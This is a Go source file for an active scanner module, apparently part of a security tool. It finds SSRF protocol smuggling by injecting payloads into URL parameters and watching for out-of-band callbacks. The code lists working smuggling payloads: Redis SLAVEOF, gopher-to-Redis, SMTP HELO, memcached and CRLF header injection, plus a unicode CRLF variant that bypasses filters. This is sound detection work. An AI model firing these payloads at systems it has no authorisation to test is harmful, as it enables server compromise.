package ssrf_protocol_smuggling

import (
	"fmt"
	"strings"

	"github.com/pkg/errors"

	"github.com/vigolium/vigolium/pkg/core/hosterrors"
	"github.com/vigolium/vigolium/pkg/dedup"
	"github.com/vigolium/vigolium/pkg/http"
	"github.com/vigolium/vigolium/pkg/httpmsg"
	"github.com/vigolium/vigolium/pkg/modules/infra"
	"github.com/vigolium/vigolium/pkg/modules/modkit"
	"github.com/vigolium/vigolium/pkg/output"
	"github.com/vigolium/vigolium/pkg/utils"
)

// oastPlaceholder is replaced per payload with a freshly generated OAST host. It
// is an unresolvable .invalid name so that if a template ever fails to substitute
// it the payload targets a guaranteed-dead host rather than a live one.
const oastPlaceholder = "oast-smuggle.placeholder.invalid"

// smugglePayload is a CRLF / cross-protocol smuggling template. The payloads carry
// LITERAL control characters (real CR, LF, space): httpmsg.InsertionPoint.BuildRequest
// query-encodes them for transit (\r→%0D, \n→%0A, space→%20), and the target's URL
// fetcher decodes them back — so the fetched URL ends up with real CR-LF embedded,
// which is what enables the cross-protocol smuggle.
type smugglePayload struct {
	label string
	tmpl  string // contains oastPlaceholder and literal control chars
}

var smugglePayloads = []smugglePayload{
	{"redis-slaveof", "http://" + oastPlaceholder + ":6379/\r\nSLAVEOF vigolium.oast 0\r\n"},
	{"smtp-helo", "http://" + oastPlaceholder + ":25/\r\nHELO vigolium.oast\r\n"},
	{"memcached-stats", "http://" + oastPlaceholder + ":11211/\r\nstats\r\n"},
	{"crlf-header", "http://" + oastPlaceholder + "/\r\nX-Vigolium-Smuggle: oast\r\n"},
	{"gopher-redis", "gopher://" + oastPlaceholder + ":6379/_*1\r\n$4\r\nPING\r\n"},
	// NodeJS unicode CR-LF (U+FF0D / U+FF0A) — survives some CRLF filters that
	// only reject ASCII control bytes.
	{"unicode-crlf", "http://" + oastPlaceholder + "/－＊SLAVEOF vigolium.oast 0"},
}

// Module implements the SSRF protocol-smuggling active scanner.
type Module struct {
	modkit.BaseActiveModule
	ds  dedup.Lazy[dedup.DiskSet]
	rhm dedup.Lazy[dedup.RequestHashManager]
}

// New creates a new SSRF protocol-smuggling module.
func New() *Module {
	m := &Module{
		BaseActiveModule: modkit.NewBaseActiveModule(
			ModuleID,
			ModuleName,
			ModuleDesc,
			ModuleShort,
			ModuleConfirmation,
			ModuleSeverity,
			ModuleConfidence,
			modkit.ScanScopeInsertionPoint,
			modkit.AllParamTypes,
		),
		ds:  dedup.LazyDiskSet("ssrf_protocol_smuggling"),
		rhm: dedup.LazyDefaultRHM("ssrf_protocol_smuggling"),
	}
	m.ModuleTags = ModuleTags
	return m
}

// ScanPerInsertionPoint injects CRLF/cross-protocol smuggling URLs pointed at an
// OAST host into URL-like parameters. Findings arrive asynchronously via OAST
// polling, so this returns nil.
func (m *Module) ScanPerInsertionPoint(
	ctx *httpmsg.HttpRequestResponse,
	ip httpmsg.InsertionPoint,
	httpClient *http.Requester,
	scanCtx *modkit.ScanContext,
) ([]*output.ResultEvent, error) {
	oast := scanCtx.OASTProv()
	if oast == nil || !oast.Enabled() {
		return nil, nil
	}

	urlx, err := ctx.URL()
	if err != nil {
		return nil, errors.Wrap(err, "failed to get URL")
	}

	if !infra.LooksLikeURLParam(ip.Name(), ip.BaseValue()) {
		return nil, nil
	}

	rhm := m.rhm.Get(scanCtx.DedupMgr())
	if rhm != nil {
		paramType := fmt.Sprintf("%d", ip.Type())
		if !rhm.ShouldCheckInsertionPoint(urlx, ctx.Request(), ip.Name(), ip.BaseValue(), paramType) {
			return nil, nil
		}
	}
	diskSet := m.ds.Get(scanCtx.DedupMgr())
	hash := utils.Sha1(fmt.Sprintf("%s%s%s", urlx.Host, urlx.Path, ip.Name()))
	if diskSet != nil && diskSet.IsSeen(hash) {
		return nil, nil
	}

	requestHash := ctx.Request().ID()

	for _, p := range smugglePayloads {
		oastHost := oast.GenerateURL(urlx.String(), ip.Name(), "ssrf-smuggle:"+p.label, ModuleID, requestHash)
		if oastHost == "" {
			continue
		}
		payloadStr := strings.ReplaceAll(p.tmpl, oastPlaceholder, oastHost)

		fuzzedRaw := ip.BuildRequest([]byte(payloadStr))
		fuzzedReq, err := httpmsg.ParseRawRequest(string(fuzzedRaw))
		if err != nil {
			continue
		}
		fuzzedReq = fuzzedReq.WithService(ctx.Service())

		resp, _, err := httpClient.Execute(fuzzedReq, http.Options{})
		if err != nil {
			if errors.Is(err, hosterrors.ErrUnresponsiveHost) {
				return nil, nil
			}
			continue
		}
		resp.Close()
	}

	// Results arrive asynchronously via OAST polling callbacks.
	return nil, nil
}
